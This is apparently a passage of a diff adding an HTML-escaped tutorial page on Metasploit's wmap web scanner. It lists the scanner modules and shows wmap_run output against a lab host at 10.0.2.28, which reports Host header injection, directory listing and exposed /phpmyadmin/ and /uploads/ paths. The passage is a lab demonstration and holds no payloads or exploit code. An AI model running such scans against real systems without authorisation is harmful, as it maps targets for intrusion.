+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Loading wmap modules...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> &lt;span class="m">39&lt;/span> wmap enabled modules loaded.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=[&lt;/span> SSL testing &lt;span class="o">]=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Target is not SSL. SSL modules disabled.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=[&lt;/span> Web Server testing &lt;span class="o">]=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/http_version
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/open_proxy
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/admin/http/tomcat_administration
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/admin/http/tomcat_utf8_traversal
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/drupal_views_user_enum
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/frontpage_login
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/host_header_injection
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/robots_txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/scraper
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/svn_scanner
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/trace
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/vhost_scanner
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/webdav_internal_ip
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/webdav_scanner
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/webdav_website_content
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=[&lt;/span> File/Dir testing &lt;span class="o">]=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/backup_file
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/brute_dirs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/copy_of_file
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/dir_listing
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/dir_scanner
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/dir_webdav_unicode_bypass
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/file_same_name_dir
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/files_dir
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/http_put
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/ms09_020_webdav_unicode_bypass
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/prev_dir_same_name_file
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/replace_ext
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/soap_xml
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/trace_axd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/verb_auth_bypass
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=[&lt;/span> Unique Query testing &lt;span class="o">]=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/admin/vmware/vcenter_forge_saml_token
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/blind_sql_query
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/error_sql_injection
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/http_traversal
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/rails_mass_assignment
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module exploit/multi/http/lcms_php_exec
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=[&lt;/span> Query testing &lt;span class="o">]=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=[&lt;/span> General testing &lt;span class="o">]=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Done.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="scan-by-using-wmap_run-with-the--e-flag">Scan by using wmap_run with the -e flag
+&lt;/h3>&lt;p>It will run all of the modules instead of just a specified one.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;span class="lnt">126
+&lt;/span>&lt;span class="lnt">127
+&lt;/span>&lt;span class="lnt">128
+&lt;/span>&lt;span class="lnt">129
+&lt;/span>&lt;span class="lnt">130
+&lt;/span>&lt;span class="lnt">131
+&lt;/span>&lt;span class="lnt">132
+&lt;/span>&lt;span class="lnt">133
+&lt;/span>&lt;span class="lnt">134
+&lt;/span>&lt;span class="lnt">135
+&lt;/span>&lt;span class="lnt">136
+&lt;/span>&lt;span class="lnt">137
+&lt;/span>&lt;span class="lnt">138
+&lt;/span>&lt;span class="lnt">139
+&lt;/span>&lt;span class="lnt">140
+&lt;/span>&lt;span class="lnt">141
+&lt;/span>&lt;span class="lnt">142
+&lt;/span>&lt;span class="lnt">143
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>msf&lt;span class="o">](&lt;/span>Jobs:0 Agents:0&lt;span class="o">)&lt;/span> &amp;gt;&amp;gt; wmap_run -e
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using ALL wmap enabled modules.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> NO WMAP NODES DEFINED. Executing &lt;span class="nb">local&lt;/span> modules
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Testing target:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Site: 10.0.2.28 &lt;span class="o">(&lt;/span>10.0.2.28&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Port: &lt;span class="m">80&lt;/span> SSL: &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Testing started. 2024-03-05 05:17:53 +0000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=[&lt;/span> SSL testing &lt;span class="o">]=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Target is not SSL. SSL modules disabled.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=[&lt;/span> Web Server testing &lt;span class="o">]=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/http_version
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> 10.0.2.28:80 Apache/2.4.7 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/open_proxy
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/admin/http/tomcat_administration
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/admin/http/tomcat_utf8_traversal
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Attempting to connect to 10.0.2.28:80
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> No File&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> found
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/drupal_views_user_enum
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> 10.0.2.28 does not appear to be vulnerable, will not &lt;span class="k">continue&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/frontpage_login
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> 10.0.2.28:80 - http://10.0.2.28/ may not support FrontPage Server Extensions
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/host_header_injection
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> 10.0.2.28:80/ &lt;span class="o">(&lt;/span>10.0.2.28&lt;span class="o">)(&lt;/span>200&lt;span class="o">)(&lt;/span>GET&lt;span class="o">)(&lt;/span>evidence into body&lt;span class="o">)&lt;/span> is vulnerable to HTTP Host header injection
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> 10.0.2.28 allows GET,HEAD,POST,OPTIONS methods
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/robots_txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/scraper
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>10.0.2.28&lt;span class="o">]&lt;/span> / &lt;span class="o">[&lt;/span>Index of /&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/svn_scanner
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/trace
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/vhost_scanner
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>10.0.2.28&lt;span class="o">]&lt;/span> Sending request with random domain YnEnK.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>10.0.2.28&lt;span class="o">]&lt;/span> Sending request with random domain EILCC.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>10.0.2.28&lt;span class="o">]&lt;/span> Unable to identify error response
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/webdav_internal_ip
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/webdav_scanner
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> 10.0.2.28 &lt;span class="o">(&lt;/span>Apache/2.4.7 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">))&lt;/span> WebDAV disabled.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/webdav_website_content
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=[&lt;/span> File/Dir testing &lt;span class="o">]=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/backup_file
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/brute_dirs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Path: /
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/copy_of_file
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/dir_listing
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Path: /
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found Directory Listing http://10.0.2.28:80/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/dir_scanner
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Path: /
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Detecting error code
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using code &lt;span class="s1">&amp;#39;404&amp;#39;&lt;/span> as not found &lt;span class="k">for&lt;/span> 10.0.2.28
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found http://10.0.2.28:80/cgi-bin/ &lt;span class="m">403&lt;/span> &lt;span class="o">(&lt;/span>10.0.2.28&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found http://10.0.2.28:80/chat/ &lt;span class="m">200&lt;/span> &lt;span class="o">(&lt;/span>10.0.2.28&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found http://10.0.2.28:80/icons/ &lt;span class="m">403&lt;/span> &lt;span class="o">(&lt;/span>10.0.2.28&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found http://10.0.2.28:80/phpmyadmin/ &lt;span class="m">200&lt;/span> &lt;span class="o">(&lt;/span>10.0.2.28&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Found http://10.0.2.28:80/uploads/ &lt;span class="m">200&lt;/span> &lt;span class="o">(&lt;/span>10.0.2.28&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Module auxiliary/scanner/http/dir_webdav_unicode_bypass
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Path: /
